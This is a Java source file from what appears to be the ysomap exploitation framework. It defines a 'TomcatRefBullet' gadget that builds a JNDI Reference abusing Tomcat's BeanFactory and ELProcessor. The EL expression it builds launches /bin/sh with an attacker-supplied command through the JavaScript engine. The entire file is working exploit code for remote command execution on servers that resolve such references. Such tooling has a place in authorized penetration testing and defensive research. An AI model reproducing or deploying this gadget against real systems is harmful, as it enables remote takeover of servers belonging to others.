package ysomap.gadget.bullet.jdk.rmi;

import org.apache.naming.ResourceRef;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.bullet.Bullet;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Dependencies({"org.apache.tomcat:tomcat-catalina:xxx"})
@Authors({ Authors.WH1T3P1G })
public class TomcatRefBullet extends Bullet<Reference> {

    @Require(name = "command", detail = "system command to execute")
    private String command;

    @Override
    public Reference getObject() throws Exception {
        ResourceRef ref = new ResourceRef(
                "javax.el.ELProcessor",
                null, "", "",
                true,"org.apache.naming.factory.BeanFactory",
                null);

        ref.add(new StringRefAddr("forceString", "KINGX=eval"));
        ref.add(new StringRefAddr("KINGX",
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                        ".newInstance().getEngineByName(\"JavaScript\")" +
                        ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](" +
                        "['/bin/sh','-c','"+ command +"'])" +
                        ".start()\")"));
        return ref;
    }
}
